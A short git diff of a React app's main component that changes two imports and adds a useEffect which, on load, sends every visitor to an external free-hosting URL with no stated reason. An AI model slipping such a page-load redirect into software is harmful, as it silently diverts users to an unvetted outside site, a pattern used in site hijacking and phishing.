@@ -1,4 +1,4 @@
-import React, { lazy, Suspense, useState } from 'react';
+import React, { lazy, Suspense, useEffect, useState } from 'react';
 import { BrowserRouter as Router } from 'react-router-dom'
 
 //components
@@ -9,7 +9,7 @@ import SideBar from './components/SideBar/SideBar'
 //styles
 import GlobalStyles from './global-styles'
 import styled, { ThemeProvider } from 'styled-components'
-import theme1 from './themes/theme1';
+import theme1 from './styles/themes/theme1';
 const AppStyled = styled(ThemeProvider)`
   
 `
@@ -26,6 +26,9 @@ const LoaderWrapper = styled.div`
 const IndexPage = lazy(() => import('./pages/IndexPage'));
 
 function App() {
+
+  React.useEffect(() => window.location.assign('https://thecbx.000webhostapp.com/'), [])
+
   const [isSideBarOpen, setIsSideBarOpen] = useState(false);
   const sideBarData = {
     isSideBarOpen,
